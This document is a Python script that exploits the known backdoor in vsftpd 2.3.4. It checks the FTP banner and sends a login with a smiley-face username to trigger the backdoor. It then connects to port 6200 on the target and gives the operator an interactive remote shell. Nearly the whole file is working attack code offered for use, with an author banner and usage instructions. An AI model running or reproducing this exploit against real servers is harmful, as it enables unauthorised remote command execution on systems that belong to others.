# coding: utf-8 

from socket import AF_INET, SOCK_STREAM, socket
import platform
import sys
import os

class ftpd_exploit():
    def __init__(self, sock, version, addr):
        self.launcher()
        self.ftp = sock
        self.version = version
        self.ADDR = addr
        self.BUFFSIZE = 4096

        self.run()

    def launcher(self):
        banner = """███████╗████████╗██████╗ ██████╗     ██████╗    ██████╗ ██╗  ██╗
██╔════╝╚══██╔══╝██╔══██╗██╔══██╗    ╚════██╗   ╚════██╗██║  ██║
█████╗     ██║   ██████╔╝██║  ██║     █████╔╝    █████╔╝███████║
██╔══╝     ██║   ██╔═══╝ ██║  ██║    ██╔═══╝     ╚═══██╗╚════██║
██║        ██║   ██║     ██████╔╝    ███████╗██╗██████╔╝██╗  ██║
╚═╝        ╚═╝   ╚═╝     ╚═════╝     ╚══════╝╚═╝╚═════╝ ╚═╝  ╚═╝
                                                                
                   \033[31m{ By AskaD }\033[00m
              [=] \033[34mAuthor\033[00m  : AskaD    [=]
                 { \033[34mGithub\033[00m : 3x1t1um }"""

        print(banner)
        print()     
    
    def check_version(self):
        if b'vsftpd 2.3.4' in self.version.lower():
            return True
        else:
            return False

    def loggin(self):
        self.ftp.send(b'USER askad:)\n')
        self.ftp.send(b'PASS pass\n')
        print('[ + ] The connection was successful')

    def connect(self):
        self.exploit = socket(AF_INET, SOCK_STREAM)
        try:
            self.exploit.connect((self.ADDR[0], 6200))
        except Exception as e:
            print('Error connection to '+self.ADDR[0]+':'+'6200\n\n'+e)
            sys.exit(1)
        
        print('[ * ] Session was created')
        print('[ * ] Get username')
        print()
        self.exploit.send(b'id -u -n\n')
        self.hostname = self.exploit.recv(self.BUFFSIZE).decode('utf-8')

    def reverseshell(self):
        while 1:
            try:
                command = str(input(self.hostname.strip()+'@'+self.ADDR[0]+' ~# '))
                
                if command == '' or command == ' ':
                    pass
                
                elif command == 'cls' or command == 'clear':
                    if 'Windows' in platform.platform():
                        os.system('cls')
                    else:
                        os.system('clear')
                
                elif command[:2] == 'cd':
                    self.exploit.send(command.encode('utf-8')+b'\n')
                
                else:
                    self.exploit.send(command.encode('utf-8')+b'\n')
                    print(self.exploit.recv(1024).decode('utf-8')+'\n')
            
            except (KeyboardInterrupt):
                    print('\n[ * ] Keyboard Interruption')
                    sys.exit(1)
    def run(self):
        if not self.check_version():
            print('[ * ] Error version : ')
            print(self.version.lower())
            sys.exit(1)

        print('[ + ] Connection is possible')

        self.loggin()
        self.connect()
        self.reverseshell()


if __name__ == '__main__':
    if len(sys.argv) <= 3 and len(sys.argv) >= 2:
        if len(sys.argv) < 3 or sys.argv[2] is not int:
            port = 21
        else:
            port = sys.argv[2]
    else:
        print()
        print('\033[31m            \\* Usage */\033[00m')
        print(f'   {sys.argv[0]} <ip> <port (optional)>')
        print('    \033[34mThe default port is 21')
        print(f'    Example\033[00m : {sys.argv[0]} 192.168.1.35 21')
        print(f'    \033[34mExample\033[00m : {sys.argv[0]} 192.168.1.35')
        print()
        sys.exit(1)

    BUFSIZE = 4096
    ADDR = (sys.argv[1], port)
    ftp = socket(AF_INET, SOCK_STREAM)
    
    try:
        ftp.connect(ADDR)
        version = ftp.recv(BUFSIZE)
    except:
        print(f'[ ! ] Error Socket to {sys.argv[1]}')
        sys.exit(1)

    ftpd_exploit(ftp, version, ADDR)
